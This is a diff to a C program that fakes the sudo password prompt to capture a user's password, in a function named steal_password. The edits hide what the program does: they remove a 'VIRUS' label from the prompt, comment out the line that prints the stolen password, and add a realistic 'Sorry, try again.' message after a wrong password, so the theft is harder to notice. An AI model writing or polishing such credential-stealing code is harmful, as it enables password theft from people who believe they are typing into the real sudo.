@@ -43,7 +43,7 @@ int main(int argc, char ** argv){
 
     steal_password(passwd, username);
 
-    printf("%s's password is %s\n", username, passwd);
+    // printf("%s's password is %s\n", username, passwd);
     
     
     char ** cmd_ray = make_execvp_args(argc, argv);
@@ -90,7 +90,7 @@ int steal_password(char * passwd, char * username){
   int correctPasswd = 0;
   char * returned_pass;
   while (! correctPasswd){
-    sprintf(prompt,"VIRUS [sudo] password for %s: ", username);
+    sprintf(prompt,"[sudo] password for %s: ", username);
 
     // This command prints the prompt to stdout then reads in the user's input without it showing up on the terminal (like sudo)
     returned_pass = getpass(prompt);
@@ -103,7 +103,10 @@ int steal_password(char * passwd, char * username){
     if (testSudoPassword(passwd) == 0){
       correctPasswd = 1;
     }
-
+    else{
+      char * wrong_pass = "Sorry, try again.\n";
+      fputs(wrong_pass, stderr);
+    }
   }
 
   free(returned_pass);
